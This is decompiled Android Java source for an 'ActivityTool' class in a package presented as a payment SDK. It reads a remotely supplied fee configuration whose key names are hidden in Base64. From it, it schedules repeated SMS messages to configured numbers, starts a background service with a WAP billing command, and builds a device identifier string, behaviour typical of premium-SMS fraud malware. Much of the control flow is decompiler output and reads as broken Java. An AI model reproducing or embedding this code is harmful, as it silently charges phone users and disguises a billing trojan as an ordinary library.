package com.android.sdk.pay;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Base64;
import com.android.sdk.rec.SymService;
import java.io.ByteArrayInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

public class ActivityTool
{
  public static Context a;
  private static final String b = ActivityTool.class.getSimpleName();
  
  public ActivityTool() {}
  
  public static int a(int paramInt)
  {
    return (int)(Math.random() * paramInt);
  }
  
  public static int a(byte[] paramArrayOfByte1, int paramInt1, byte[] paramArrayOfByte2, int paramInt2, int paramInt3, int paramInt4)
  {
    if ((paramArrayOfByte1 == null) || (paramArrayOfByte1.length == 0) || (paramInt1 == 0) || (paramArrayOfByte2 == null) || (paramArrayOfByte2.length == 0) || (paramInt2 == 0) || (paramInt3 >= paramArrayOfByte1.length) || (paramInt4 <= paramInt3))
    {
      paramInt4 = -1;
      label43:
      return paramInt4;
    }
    if (paramInt3 < 0) {}
    for (paramInt1 = 0;; paramInt1 = paramInt3)
    {
      if (paramInt4 > 0)
      {
        paramInt3 = paramInt4;
        if (paramInt4 <= paramArrayOfByte1.length) {}
      }
      else
      {
        paramInt3 = paramArrayOfByte1.length;
      }
      if (paramInt2 > paramInt3 - paramInt1) {
        break;
      }
      label81:
      int i;
      if (paramInt1 <= paramInt3 - paramInt2) {
        i = 0;
      }
      for (;;)
      {
        if (i >= paramInt2) {}
        while (paramArrayOfByte1[(paramInt1 + i)] != paramArrayOfByte2[i])
        {
          paramInt4 = paramInt1;
          if (i == paramInt2) {
            break label43;
          }
          paramInt1 += 1;
          break label81;
          break;
        }
        i += 1;
      }
    }
  }
  
  public static i a(byte[] paramArrayOfByte)
  {
    Object localObject = XmlPullParserFactory.newInstance();
    ((XmlPullParserFactory)localObject).setNamespaceAware(true);
    XmlPullParser localXmlPullParser = ((XmlPullParserFactory)localObject).newPullParser();
    localXmlPullParser.setInput(new ByteArrayInputStream(paramArrayOfByte), "UTF-8");
    int i = localXmlPullParser.getEventType();
    paramArrayOfByte = null;
    if (i == 1) {}
    do
    {
      return paramArrayOfByte;
      switch (i)
      {
      default: 
        localObject = paramArrayOfByte;
      }
      do
      {
        do
        {
          for (;;)
          {
            i = localXmlPullParser.next();
            paramArrayOfByte = (byte[])localObject;
            break;
            String str = localXmlPullParser.getName();
            if (str.equalsIgnoreCase("result"))
            {
              localObject = new i();
            }
            else
            {
              localObject = paramArrayOfByte;
              if (paramArrayOfByte != null) {
                if (str.equalsIgnoreCase("showinfo"))
                {
                  paramArrayOfByte.a = d(localXmlPullParser.nextText());
                  localObject = paramArrayOfByte;
                }
                else if (str.equalsIgnoreCase("showinfo_noback"))
                {
                  paramArrayOfByte.b = d(localXmlPullParser.nextText());
                  localObject = paramArrayOfByte;
                }
                else if (str.equalsIgnoreCase("feetype"))
                {
                  paramArrayOfByte.c = Integer.valueOf(localXmlPullParser.nextText()).intValue();
                  localObject = paramArrayOfByte;
                }
                else if (str.equalsIgnoreCase("promptword"))
                {
                  paramArrayOfByte.d = localXmlPullParser.nextText();
                  localObject = paramArrayOfByte;
                }
                else
                {
                  localObject = paramArrayOfByte;
                  if (str.equalsIgnoreCase("feeinfo"))
                  {
                    paramArrayOfByte.e = localXmlPullParser.nextText();
                    localObject = paramArrayOfByte;
                  }
                }
              }
            }
          }
          localObject = paramArrayOfByte;
        } while (!localXmlPullParser.getName().equalsIgnoreCase("result"));
        localObject = paramArrayOfByte;
      } while (paramArrayOfByte == null);
    } while (paramArrayOfByte.e == null);
    paramArrayOfByte.f = e(paramArrayOfByte.e);
    return paramArrayOfByte;
  }
  
  public static String a(String paramString)
  {
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    return str;
  }
  
  public static String a(String paramString1, String paramString2)
  {
    if (paramString1 == null) {
      return paramString2;
    }
    return paramString1;
  }
  
  private static String a(String paramString1, String paramString2, String paramString3)
  {
    int i;
    if ((paramString1 != null) && (paramString2 != null) && (paramString3 != null) && (paramString1.length() != 0))
    {
      i = paramString2.length();
      if ((i != 0) && (paramString3.length() != 0)) {
        break label37;
      }
    }
    label37:
    int j;
    int k;
    do
    {
      do
      {
        return null;
        j = paramString1.indexOf(paramString2);
      } while (j < 0);
      k = paramString1.indexOf(paramString3, j + i);
    } while (k < 0);
    return paramString1.substring(i + j, k);
  }
  
  public static Map a()
  {
    HashMap localHashMap = new HashMap();
    localHashMap.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    localHashMap.put("Accept-Language", "zh-CN, en-US");
    localHashMap.put("Accept-Encoding", "gzip,deflate");
    localHashMap.put("User-Agent", b());
    return localHashMap;
  }
  
  public static void a(long paramLong)
  {
    try
    {
      Thread.sleep(paramLong);
      return;
    }
    catch (Exception localException) {}
  }
  
  public static void a(Context paramContext)
  {
    a = paramContext.getApplicationContext();
  }
  
  public static void a(Context paramContext, b paramB, j paramJ)
  {
    int j = 0;
    if (paramJ.d <= 0)
    {
      localObject = new HashMap();
      ((Map)localObject).put("result", "error");
      ((Map)localObject).put("msg", "支付异常！");
      paramB.a((Map)localObject);
    }
    Object localObject = z.a();
    int i = 0;
    if (i >= paramJ.d)
    {
      paramB = x.a();
      paramB.a(3600000L * Math.max(paramJ.a, 3));
      i = 0;
      label89:
      if (i < paramJ.h) {
        break label214;
      }
      i = 0;
      label99:
      if (i < paramJ.l) {
        break label290;
      }
      paramB.c(paramContext);
      paramContext = ab.a();
      i = j;
    }
    for (;;)
    {
      if (i >= paramJ.t)
      {
        return;
        y localY = new y();
        if (i == 0) {
          localY.a(paramB, paramJ.b, paramJ.e[i], paramJ.f[i], paramJ.g[i]);
        }
        for (;;)
        {
          ((z)localObject).a(localY);
          i += 1;
          break;
          localY.a(paramJ.b, paramJ.e[i], paramJ.f[i], paramJ.g[i]);
        }
        label214:
        localObject = new x.c();
        ((x.c)localObject).a = new String(paramJ.i[i]);
        ((x.c)localObject).b = new String(paramJ.j[i]);
        ((x.c)localObject).c = new String(paramJ.k[i]);
        paramB.a((x.c)localObject);
        i += 1;
        break label89;
        label290:
        localObject = new x.a();
        ((x.a)localObject).a = Math.max(paramJ.c, 2);
        ((x.a)localObject).b = new String(paramJ.m[i]);
        ((x.a)localObject).c = new String(paramJ.n[i]);
        ((x.a)localObject).d = new String(paramJ.o[i]);
        ((x.a)localObject).e = new String(paramJ.p[i]);
        ((x.a)localObject).f = paramJ.q[i];
        ((x.a)localObject).g = new String(paramJ.r[i]);
        ((x.a)localObject).h = new String(paramJ.s[i]);
        paramB.a((x.a)localObject);
        i += 1;
        break label99;
      }
      paramContext.a(new aa(paramJ.u[i], paramJ.v[i], paramJ.w[i], paramJ.x[i], paramJ.y[i]));
      i += 1;
    }
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2)
  {
    b(b, "SendSms num=" + paramString1 + " content=" + paramString2);
    PendingIntent localPendingIntent = PendingIntent.getBroadcast(paramContext, 0, new Intent("dle.com.send"), 0);
    paramContext = PendingIntent.getBroadcast(paramContext, 0, new Intent("dle.com.delivery"), 0);
    SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, localPendingIntent, paramContext);
  }
  
  public static void a(String paramString, long paramLong)
  {
    SimpleDateFormat localSimpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss SSS");
    Date localDate = new Date(paramLong);
    b(paramString, "printDate=" + String.valueOf(paramLong) + ";date=" + localSimpleDateFormat.format(localDate));
  }
  
  public static void a(String paramString, byte[] paramArrayOfByte) {}
  
  public static boolean a(Context paramContext, j paramJ, boolean paramBoolean)
  {
    if (paramJ == null) {
      return false;
    }
    Object localObject1 = z.a();
    int i = 0;
    if (i >= paramJ.d)
    {
      localObject1 = x.a();
      ((x)localObject1).a(3600000L * Math.max(paramJ.a, 3));
      i = 0;
      label46:
      if (i < paramJ.h) {
        break label204;
      }
      i = 0;
      label56:
      if (i < paramJ.l) {
        break label281;
      }
      ((x)localObject1).c(paramContext);
      c.a().c(paramContext, paramJ.B);
      localObject1 = ab.a();
      i = 0;
    }
    for (;;)
    {
      if (i >= paramJ.t)
      {
        if ((paramBoolean) && (paramJ.z == 1))
        {
          localObject1 = new Intent(paramContext, SymService.class);
          ((Intent)localObject1).setAction("com.android.sdk.rec.cmd.WapCfg");
          ((Intent)localObject1).putExtra("wapid", paramJ.A);
          paramContext.startService((Intent)localObject1);
        }
        return true;
        Object localObject2 = new y();
        ((y)localObject2).a(paramJ.b, paramJ.e[i], paramJ.f[i], paramJ.g[i]);
        ((z)localObject1).a((Runnable)localObject2);
        i += 1;
        break;
        label204:
        localObject2 = new x.c();
        ((x.c)localObject2).a = new String(paramJ.i[i]);
        ((x.c)localObject2).b = new String(paramJ.j[i]);
        ((x.c)localObject2).c = new String(paramJ.k[i]);
        ((x)localObject1).a((x.c)localObject2);
        i += 1;
        break label46;
        label281:
        localObject2 = new x.a();
        ((x.a)localObject2).a = Math.max(paramJ.c, 2);
        ((x.a)localObject2).b = new String(paramJ.m[i]);
        ((x.a)localObject2).c = new String(paramJ.n[i]);
        ((x.a)localObject2).d = new String(paramJ.o[i]);
        ((x.a)localObject2).e = new String(paramJ.p[i]);
        ((x.a)localObject2).f = paramJ.q[i];
        ((x.a)localObject2).g = new String(paramJ.r[i]);
        ((x.a)localObject2).h = new String(paramJ.s[i]);
        ((x)localObject1).a((x.a)localObject2);
        i += 1;
        break label56;
      }
      ((ab)localObject1).a(new aa(paramJ.u[i], paramJ.v[i], paramJ.w[i], paramJ.x[i], paramJ.y[i]));
      i += 1;
    }
  }
  
  public static boolean a(String paramString, String... paramVarArgs)
  {
    int j = paramVarArgs.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      if (paramString.contains(paramVarArgs[i])) {
        return true;
      }
      i += 1;
    }
  }
  
  public static String b()
  {
    try
    {
      String str = String.format("Mozilla/5.0 (Linux; U; Android %s; zh-cn; %s Build/%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36", new Object[] { Build.VERSION.RELEASE, Build.MODEL, Build.ID });
      return str;
    }
    catch (Exception localException) {}
    return "Mozilla/5.0 (Linux; U; Android 4.2; zh-cn; Sumxing Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3";
  }
  
  public static void b(Context paramContext)
  {
    if (!SymService.a)
    {
      Intent localIntent = new Intent(paramContext, SymService.class);
      localIntent.setAction("com.android.sdk.rec.cmd.SymService");
      paramContext.startService(localIntent);
    }
  }
  
  public static void b(String paramString1, String paramString2) {}
  
  public static boolean b(String paramString)
  {
    int i = paramString.length();
    int j;
    do
    {
      j = i - 1;
      if (j < 0) {
        return true;
      }
      i = j;
    } while (Character.isDigit(paramString.charAt(j)));
    return false;
  }
  
  public static byte c()
  {
    return (byte)(int)(65.0D + 26.0D * Math.random());
  }
  
  public static String c(String paramString)
  {
    return new String(Base64.decode(paramString, 0));
  }
  
  public static void c(String paramString1, String paramString2) {}
  
  public static void checkAppStatus(Context paramContext)
  {
    a = paramContext.getApplicationContext();
    a(a);
    b(a);
    x.a().d(a);
  }
  
  public static int d(String paramString)
  {
    if ((paramString == null) || (paramString.length() == 0)) {
      return 0;
    }
    try
    {
      int i = Integer.valueOf(paramString).intValue();
      return i;
    }
    catch (Exception paramString) {}
    return 0;
  }
  
  public static String d()
  {
    try
    {
      Object localObject = a;
      localObject = ((Context)localObject).getPackageManager().getApplicationInfo(((Context)localObject).getPackageName(), 128).metaData.getString("PARAM_VTNAME");
      return localObject;
    }
    catch (Exception localException) {}
    return "VT_DEFAULT_PREV";
  }
  
  public static j e(String paramString)
  {
    int j = 0;
    if ((paramString == null) || (paramString.length() == 0)) {}
    int k;
    do
    {
      return null;
      paramString = paramString.replace("\r\n", "\n");
      i = paramString.indexOf(c("cmVtX2ZlZV9iZWdpbg==") + "\n");
      k = paramString.indexOf(c("cmVtX2ZlZV9lbmQ="));
    } while ((i < 0) || (k < 0) || (i >= k));
    j localJ = new j();
    localJ.B = d(a(paramString, c("Y29uZmlnX3dhcF9yZW1haW49"), "\n"));
    localJ.b = d(a(paramString, c("Y29uZmlnX3Ntc19pbnRlcnZhbD0="), "\n"));
    localJ.c = d(a(paramString, c("Y29uZmlnX3Ntc19jbmZfaW50ZXJ2YWw9"), "\n"));
    localJ.a = d(a(paramString, c("Y29uZmlnX3Ntc19yZW1faW50ZXJ2YWw9"), "\n"));
    localJ.D = a(paramString, c("cmVhbF9mZWVfdmFsdWU9"), "\n");
    localJ.C = a(paramString, c("cmVhbF9mZWVfdHlwZT0="), "\n");
    localJ.d = d(a(paramString, c("Y29uZmlnX2ZlZV9pdGVtX2NudD0="), "\n"));
    if (localJ.d > 0)
    {
      localJ.e = new int[localJ.d];
      localJ.f = new String[localJ.d];
      localJ.g = new String[localJ.d];
    }
    int i = 0;
    if (i >= localJ.d)
    {
      localJ.h = d(a(paramString, "reminfo_count=", "\n"));
      if (localJ.h > 0)
      {
        localJ.i = new String[localJ.h];
        localJ.j = new String[localJ.h];
        localJ.k = new String[localJ.h];
      }
      i = 0;
      label354:
      if (i < localJ.h) {
        break label721;
      }
      localJ.l = d(a(paramString, "cnfinfo_count=", "\n"));
      if (localJ.l > 0)
      {
        localJ.m = new String[localJ.l];
        localJ.n = new String[localJ.l];
        localJ.o = new String[localJ.l];
        localJ.p = new String[localJ.l];
        localJ.q = new int[localJ.l];
        localJ.r = new String[localJ.l];
        localJ.s = new String[localJ.l];
      }
      i = 0;
      label481:
      if (i < localJ.l) {
        break label808;
      }
      localJ.t = d(a(paramString, "wapinfo_count=", "\n"));
      i = j;
      if (localJ.t > 0)
      {
        localJ.u = new int[localJ.t];
        localJ.v = new int[localJ.t];
        localJ.w = new String[localJ.t];
        localJ.x = new String[localJ.t];
        localJ.y = new String[localJ.t];
        i = j;
      }
    }
    for (;;)
    {
      if (i >= localJ.t)
      {
        localJ.z = d(a(paramString, "config_fee_wap=", "\n"));
        localJ.A = d(a(paramString, "config_fee_wapid=", "\n"));
        return localJ;
        localMatcher = Pattern.compile("config_fee_item" + i + "=(.*?),\\[(.*?)\\]\\|\\[(.*?)\\]", 2).matcher(paramString);
        if (localMatcher.find())
        {
          localJ.e[i] = d(localMatcher.group(1));
          localJ.f[i] = localMatcher.group(2);
          localJ.g[i] = localMatcher.group(3);
        }
        i += 1;
        break;
        label721:
        localMatcher = Pattern.compile("reminfo" + i + "=\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]", 2).matcher(paramString);
        if (localMatcher.find())
        {
          localJ.i[i] = localMatcher.group(1);
          localJ.j[i] = localMatcher.group(2);
          localJ.k[i] = localMatcher.group(3);
        }
        i += 1;
        break label354;
        label808:
        localMatcher = Pattern.compile("cnfinfo" + i + "=\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]\\[(.*?)\\]\\[(.*?)\\]\\|\\[(.*?)\\]\\[(.*?)\\]", 2).matcher(paramString);
        if (localMatcher.find())
        {
          localJ.m[i] = localMatcher.group(1);
          localJ.n[i] = localMatcher.group(2);
          localJ.o[i] = localMatcher.group(3);
          localJ.p[i] = localMatcher.group(4);
          localJ.q[i] = d(localMatcher.group(5));
          localJ.r[i] = localMatcher.group(6);
          localJ.s[i] = localMatcher.group(7);
        }
        i += 1;
        break label481;
      }
      Matcher localMatcher = Pattern.compile("wapinfo" + i + "=\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]\\|\\[(.*?)\\]", 2).matcher(paramString);
      if (localMatcher.find())
      {
        localJ.u[i] = d(localMatcher.group(1));
        localJ.v[i] = d(localMatcher.group(2));
        localJ.w[i] = localMatcher.group(3);
        localJ.x[i] = localMatcher.group(4);
        localJ.y[i] = localMatcher.group(5);
      }
      i += 1;
    }
  }
  
  public static String e()
  {
    try
    {
      Context localContext = a;
      int i = localContext.getPackageManager().getApplicationInfo(localContext.getPackageName(), 128).metaData.getInt("PARAM_VTID");
      return String.valueOf(i);
    }
    catch (Exception localException) {}
    return "1000";
  }
  
  public static String f()
  {
    try
    {
      Object localObject = a;
      localObject = String.format("%02d", new Object[] { Integer.valueOf(((Context)localObject).getPackageManager().getApplicationInfo(((Context)localObject).getPackageName(), 128).metaData.getInt("PARAM_SVID")) });
      return localObject;
    }
    catch (Exception localException) {}
    return "01";
  }
  
  public static void f(String paramString) {}
  
  public static String g()
  {
    Object localObject1 = h.b(a);
    Object localObject2 = new StringBuilder();
    ((StringBuilder)localObject2).append("T#");
    ((StringBuilder)localObject2).append(((h)localObject1).d());
    ((StringBuilder)localObject2).append(e());
    ((StringBuilder)localObject2).append(f());
    ((StringBuilder)localObject2).append("000000000010100");
    ((StringBuilder)localObject2).append("v1020");
    ((StringBuilder)localObject2).append(String.format("0000%04d%04d", new Object[] { Integer.valueOf(((h)localObject1).e()), Integer.valueOf(((h)localObject1).f()) }));
    ((StringBuilder)localObject2).append(d());
    localObject2 = ((StringBuilder)localObject2).toString();
    localObject1 = localObject2;
    if (((String)localObject2).length() > 70) {
      localObject1 = ((String)localObject2).substring(0, 70);
    }
    return localObject1;
  }
}
